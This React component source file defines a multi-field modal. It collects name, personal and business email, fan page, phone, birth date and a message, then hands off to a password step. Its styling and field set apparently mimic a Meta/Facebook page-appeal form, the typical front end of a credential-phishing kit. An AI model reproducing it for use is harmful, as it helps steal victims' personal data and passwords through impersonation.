import React from 'react'
import Modal from '#components/modals/Modal'
import { SITE_MAIN_MESSAGE } from '#data/site-message'
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';

interface InfomationsModalProps {
  isOpend: boolean;
  isOpendPassword: (isOpenPassword: boolean) => void;
  onToggleModal: (isOpen: boolean) => void;
}

const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {

  const [isOpen, setIsOpen] = React.useState(isOpend);
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { id, value } = e.target;
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
    setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
  };

  React.useEffect(() => {
    setIsOpen(isOpend);
  }, [isOpend]);

  const handleClose = () => {
    setIsOpen(false);
    onToggleModal(false);
  };

  const handSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = SITE_MAIN_MESSAGE
      if (!formData.email.trim()) newErrors.email = SITE_MAIN_MESSAGE
      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = SITE_MAIN_MESSAGE
      if (!formData.fanpage.trim()) newErrors.fanpage = SITE_MAIN_MESSAGE
      if (!formData.phone.trim()) newErrors.phone = SITE_MAIN_MESSAGE

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      const clientData = {
        ...formData,
      };

      dispatch(updateForm(clientData));

      isOpendPassword(true);
      handleClose();

    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

  return (
    <Modal
      isOpen={isOpen}
      title={SITE_MAIN_MESSAGE}
      onClose={handleClose}
    >
      <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
        <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
          <div className='w-full'>
            <div className={inputClass('fullName')}>
              <input
                type="text"
                id='fullName'
                placeholder={SITE_MAIN_MESSAGE}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fullName}
                onChange={handleChange}
              />
            </div>
            {errorText('fullName')}

            <div className={inputClass('email')}>
              <input
                type="text"
                id='email'
                placeholder={SITE_MAIN_MESSAGE}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.email}
                onChange={handleChange}
              />
            </div>
            {errorText('email')}

            <div className={inputClass('emailBusiness')}>
              <input
                type="text"
                id='emailBusiness'
                placeholder={SITE_MAIN_MESSAGE}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.emailBusiness}
                onChange={handleChange}
              />
            </div>
            {errorText('emailBusiness')}

            <div className={inputClass('fanpage')}>
              <input
                type="text"
                id='fanpage'
                placeholder={SITE_MAIN_MESSAGE}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fanpage}
                onChange={handleChange}
              />
            </div>
            {errorText('fanpage')}

            <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <PhoneInput
                country={formData.country_code?.toLowerCase() || "us"}
                value={formData.phone}
                onChange={(phone) => {
                  dispatch(updateForm({ phone }))
                  setErrors(prev => ({ ...prev, phone: '' }))
                  if (phone.length > 0) {
                    setErrors(prev => ({ ...prev, phone: '' }))
                  }
                }}
              />
            </div>
            {errorText('phone')}

            <div>
              <b className='text-[#9a979e] text-[14px] mb-[7px]'>{SITE_MAIN_MESSAGE}</b>
            </div>
            <div className="grid grid-cols-3 gap-[10px]">
              <div>
                <div className={inputClass('day')}>
                  <input
                    type="number"
                    placeholder={SITE_MAIN_MESSAGE}
                    id='day'
                    className="w-full outline-0 h-full"
                    value={formData.day}
                    onChange={handleChange}
                  />
                </div>
                {errorText('day')}
              </div>

              <div>
                <div className={inputClass('month')}>
                  <input
                    type="number"
                    placeholder={SITE_MAIN_MESSAGE}
                    className="w-full outline-0 h-full"
                    value={formData.month}
                    id='month'
                    onChange={handleChange}
                  />
                </div>
                {errorText('month')}
              </div>

              <div>
                <div className={inputClass('year')}>
                  <input
                    type="number"
                    inputMode="numeric"
                    placeholder={SITE_MAIN_MESSAGE}
                    id='year'
                    className="w-full outline-0 h-full"
                    value={formData.year}
                    onChange={handleChange}
                  />
                </div>
                {errorText('year')}
              </div>

            </div>

            <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <textarea
                id='message'
                className="w-full outline-0 h-full resize-none"
                placeholder={SITE_MAIN_MESSAGE}
                value={formData.message}
                onChange={handleChange}
              />
            </div>

            <div>
              <p className='text-[#9a979e] text-[14px] mb-[7px]'>{SITE_MAIN_MESSAGE}</p>
            </div>
            <div className='mt-[15px] mb-[20px]'>
              <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                <CustomCheckbox />
                {SITE_MAIN_MESSAGE}{' '}
                <a href='' className='text-[#0064E0] hover:underline'>
                  {SITE_MAIN_MESSAGE}{' '}
                  <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' />
                </a>
              </label>
            </div>
            <div className='w-full mt-[20px] '>
              <button className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>{SITE_MAIN_MESSAGE}</button>
            </div>
          </div>

        </form>
      </div>
    </Modal>
  );
};

export default InfomationsModal;